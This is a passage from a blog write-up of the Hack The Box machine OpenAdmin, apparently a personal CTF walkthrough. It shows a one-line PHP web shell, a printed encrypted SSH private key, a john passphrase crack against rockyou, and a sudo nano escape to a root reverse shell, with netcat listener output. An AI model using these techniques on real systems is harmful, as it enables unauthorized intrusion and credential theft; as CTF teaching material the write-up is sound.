         <span class="nc">.form-signin</span> <span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s1">"password"</span><span class="o">]</span> <span class="p">{</span>
            <span class="nl">margin-bottom</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
            <span class="nl">border-top-left-radius</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
            <span class="nl">border-top-right-radius</span><span class="p">:</span> <span class="m">0</span><span class="p">;</span>
            <span class="nl">border-color</span><span class="p">:</span><span class="m">#017572</span><span class="p">;</span>
         <span class="p">}</span>

         <span class="nt">h2</span><span class="p">{</span>
            <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
            <span class="nl">color</span><span class="p">:</span> <span class="m">#017572</span><span class="p">;</span>
         <span class="p">}</span>
      <span class="nt">&lt;/style&gt;</span>

   <span class="nt">&lt;/head&gt;</span>
   <span class="nt">&lt;body&gt;</span>

      <span class="nt">&lt;h2&gt;</span>Enter Username and Password<span class="nt">&lt;/h2&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class = </span><span class="s">"container form-signin"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"featurette-heading"</span><span class="nt">&gt;</span>Login Restricted.<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;&lt;/span&gt;&lt;/h2&gt;</span>
                <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>

      <span class="nt">&lt;div</span> <span class="na">class = </span><span class="s">"container"</span><span class="nt">&gt;</span>

         <span class="nt">&lt;form</span> <span class="na">class = </span><span class="s">"form-signin"</span> <span class="na">role = </span><span class="s">"form"</span>
            <span class="na">action = </span><span class="s">"/index.php"</span> <span class="na">method = </span><span class="s">"post"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;h4</span> <span class="na">class = </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;/h4&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"text"</span> <span class="na">class = </span><span class="s">"form-control"</span>
               <span class="na">name = </span><span class="s">"username"</span>
               <span class="na">required</span> <span class="na">autofocus</span><span class="nt">&gt;&lt;/br&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"password"</span> <span class="na">class = </span><span class="s">"form-control"</span>
               <span class="na">name = </span><span class="s">"password"</span> <span class="na">required</span><span class="nt">&gt;</span>
            <span class="nt">&lt;button</span> <span class="na">class = </span><span class="s">"btn btn-lg btn-primary btn-block"</span> <span class="na">type = </span><span class="s">"submit"</span>
               <span class="na">name = </span><span class="s">"login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;</span>
         <span class="nt">&lt;/form&gt;</span>

      <span class="nt">&lt;/div&gt;</span>

   <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>The file that is being displayed and executed is <code class="language-plaintext highlighter-rouge">/index.php</code> from the dir <code class="language-plaintext highlighter-rouge">/var/www/internal</code> . First we need to find out that the <code class="language-plaintext highlighter-rouge">service</code> is running as which <code class="language-plaintext highlighter-rouge">user</code> ?</p><p>there are three files in the dir.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxrwx--- 2 jimmy internal 4096 May  1 13:26 <span class="nb">.</span>
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal 3229 Nov 22 23:24 index.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  185 Nov 23 16:37 logout.php
<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  339 Nov 23 17:40 main.php
</pre></table></code></div></div><p>I have <code class="language-plaintext highlighter-rouge">r+w</code> permissions in the dir <code class="language-plaintext highlighter-rouge">internal</code> so i can create <code class="language-plaintext highlighter-rouge">.php</code> that can execute commands as in <code class="language-plaintext highlighter-rouge">cmd=</code> <code class="language-plaintext highlighter-rouge">param</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'&lt;?php echo "&lt;pre&gt;"; system($_GET['</span>cmd<span class="s1">']); ?&gt;'</span> <span class="o">&gt;&gt;</span> test.php
jimmy@openadmin:/var/www/internal<span class="nv">$ </span>curl 127.0.0.1:52846/test.php?cmd<span class="o">=</span><span class="nb">whoami</span>

&lt;pre&gt;joanna
</pre></table></code></div></div><p>And here we go , We just confirmed that the service is running as <code class="language-plaintext highlighter-rouge">joanna</code></p><p>There are two ways to get a shell as <code class="language-plaintext highlighter-rouge">joanna</code> as far i did it.</p><blockquote><p>1st method</p></blockquote><h2 id="by-grabbing-the-id_rsa-using-mainphp">By grabbing the id_rsa using main.php</h2><p>the content of the file <code class="language-plaintext highlighter-rouge">main.php</code> is following</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span> <span class="p">};</span> 
<span class="c1"># Open Admin Trusted</span>
<span class="c1"># OpenAdmin</span>
<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;h3&gt;</span>Don't forget your "ninja" password<span class="nt">&lt;/h3&gt;</span>
Click here to logout <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"logout.php"</span> <span class="na">tite = </span><span class="s">"Logout"</span><span class="nt">&gt;</span>Session
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Making a <code class="language-plaintext highlighter-rouge">request</code> to <strong>main.php</strong>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span>curl 127.0.0.1:52846/main.php
&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
<span class="nt">-----END</span> RSA PRIVATE KEY-----
&lt;/pre&gt;&lt;html&gt;
&lt;h3&gt;Don<span class="s1">'t forget your "ninja" password&lt;/h3&gt;
Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session
&lt;/html&gt;
</span></pre></table></code></div></div><p>We got the encrypted <code class="language-plaintext highlighter-rouge">private-ssh-keys</code>.</p><h2 id="cracking-the-encrypted-id_rsa-using-john">Cracking the encrypted id_rsa using john</h2><p>First we need to make a crackable hash of the <code class="language-plaintext highlighter-rouge">encrypted</code> <strong>id_rsa</strong> So john can crack it. I will be using <code class="language-plaintext highlighter-rouge">ssh2john.py</code> you can get it from <a href="https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py" target="_blank">Here</a></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  openadmin python2 /usr/share/john/ssh2john.py joanna-id_rsa <span class="o">&gt;&gt;</span> hash-id_rsa
</pre></table></code></div></div><p>Now its time for john to make some noice.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>➜  openadmin john hash-id_rsa <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
finding a possible candidate.
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
bloodninjas      <span class="o">(</span>joanna-id_rsa<span class="o">)</span>
Warning: Only 2 candidates left, minimum 4 needed <span class="k">for </span>performance.
1g 0:00:00:07 DONE <span class="o">(</span>2020-05-01 20:14<span class="o">)</span> 0.1371g/s 1967Kp/s 1967Kc/s 1967KC/sa6_123..<span class="k">*</span>7¡Vamos!
Session completed
</pre></table></code></div></div><p>we got <code class="language-plaintext highlighter-rouge">bloodninjas</code> as the Cracked <strong>passpharse</strong></p><p>Now its time to login using the key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>➜  openadmin <span class="nb">chmod </span>600 joanna-id_rsa 
➜  openadmin ssh <span class="nt">-i</span> joanna-id_rsa joanna@openadmin.htb
Enter passphrase <span class="k">for </span>key <span class="s1">'joanna-id_rsa'</span>: 
Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-70-generic x86_64<span class="o">)</span>

Last login: Fri May  1 11:31:30 2020 from 10.10.16.81
joanna@openadmin:~<span class="nv">$ </span>
</pre></table></code></div></div><p>And i am in as <code class="language-plaintext highlighter-rouge">joanna</code>.</p><blockquote><p>2nd method</p></blockquote><h2 id="by-creating-a-new-php-file-containing-rev-shell">By creating a new php file containing rev-shell</h2><p>Now as the service is running as <code class="language-plaintext highlighter-rouge">joanna</code> and i have <code class="language-plaintext highlighter-rouge">r+w</code> permissions in the <code class="language-plaintext highlighter-rouge">internal</code> dir. SO we can simply create a <code class="language-plaintext highlighter-rouge">.php</code> file that will gives us connection back when we will make a request to it.</p><p>i made a <code class="language-plaintext highlighter-rouge">0xprashant.php</code> with the following code.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

<span class="cp">?&gt;</span> 
</pre></table></code></div></div><p>And i make the request</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span>curl 127.0.0.1:52846/0xprashant.php
</pre></table></code></div></div><p>And on my netcat <code class="language-plaintext highlighter-rouge">listener</code> i got shell as <code class="language-plaintext highlighter-rouge">joanna</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 1234
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.171.
Ncat: Connection from 10.10.10.171:55726.
Linux openadmin 4.15.0-70-generic <span class="c">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
 14:00:00 up  8:44,  3 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jimmy    pts/0    10.10.14.25      13:57    8.00s  0.05s  0.00s curl 127.0.0.1:52846/0xprashant.php
jimmy    pts/1    10.10.14.25      13:17   18:16   0.10s  0.10s <span class="nt">-bash</span>
joanna   pts/2    10.10.14.25      13:49    2:19   0.05s  0.05s <span class="nt">-bash</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span>,1002<span class="o">(</span>internal<span class="o">)</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1050<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
joanna@openadmin:/<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>joanna@openadmin:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
c9b-------------------------1b5f
joanna@openadmin:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="privilege-escalationroot">Privilege-escalation@root:~$</h1><p>After getting a full ssh shell as <code class="language-plaintext highlighter-rouge">joanna</code>. I run <code class="language-plaintext highlighter-rouge">sudo -l</code> to check if i may run any command as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>joanna on openadmin:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User joanna may run the following commands on openadmin:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv
</pre></table></code></div></div><p>so i can edit the file <code class="language-plaintext highlighter-rouge">/opt/priv</code> using <code class="language-plaintext highlighter-rouge">nano</code> as <code class="language-plaintext highlighter-rouge">root</code>.</p><p>I searched for <code class="language-plaintext highlighter-rouge">nano</code> on <a href="https://gtfobins.github.io/gtfobins/nano/" target="_blank">Gtfobins</a></p><p>open the file <code class="language-plaintext highlighter-rouge">/opt/priv</code> in nano as root (sudo). Now press <code class="language-plaintext highlighter-rouge">ctrl+r and then ctrl+x</code> to run commands</p><p>The command that i will run will be a <code class="language-plaintext highlighter-rouge">bash-rev-shell-cmd</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo </span>nano /opt/priv
</pre></table></code></div></div><p>and we are in nano and after running <code class="language-plaintext highlighter-rouge">ctrl+r</code> we are in file to insert</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-5.png" alt="Nano" /></p><p>And now by just hitting a <code class="language-plaintext highlighter-rouge">ctrl+x</code> we are ready to <code class="language-plaintext highlighter-rouge">execute</code> a command</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/openadmin/image-6.png" alt="Nano" /></p><p>Hit enter and on our <code class="language-plaintext highlighter-rouge">netcat</code> listener we got a shell as <code class="language-plaintext highlighter-rouge">root</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 2345 
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.10.10.171.
Ncat: Connection from 10.10.10.171:54498.
root@openadmin:~# 
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@openadmin:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
2f---------------------------b561
root@openadmin:/root# 
</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>OpenNetadmin-exploit<td><a href="https://www.exploit-db.com/exploits/47691" target="_blank">Click-Here</a><tr><td>Gtfobins-nano<td><a href="https://gtfobins.github.io/gtfobins/nano/" target="_blank">Click-Here</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/openadmin-exploit/" class="post-tag no-text-decoration" >Openadmin-exploit</a> <a href="/tags/local-port/" class="post-tag no-text-decoration" >local-port</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/cracking-id_rsa/" class="post-tag no-text-decoration" >cracking-id_rsa</a> <a href="/tags/privilege-escaltion-via-text-editor/" class="post-tag no-text-decoration" >privilege-escaltion via text editor</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Openadmin writeup - 0xPrashant&url=http://localhost:4000/posts/htb-openadmin/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Openadmin writeup - 0xPrashant&u=http://localhost:4000/posts/htb-openadmin/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Openadmin writeup - 0xPrashant&url=http://localhost:4000/posts/htb-openadmin/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-traverxec/"><div class="card-body"> <span class="timeago small" > Feb 15 <i class="unloaded">2020-02-15T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Traverxec writeup</h3><div class="text-muted small"><p> information Column Details Name Traverxec IP 10.10.10.165 Points 20 Os Linux ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-quick/" class="btn btn-outline-primary"><p>Hackthebox Quick writeup</p></a> <a href="/posts/htb-admirer/" class="btn btn-outline-primary"><p>Hackthebox Admirer writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-openadmin/'; this.page.identifier = '/posts/htb-openadmin/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script 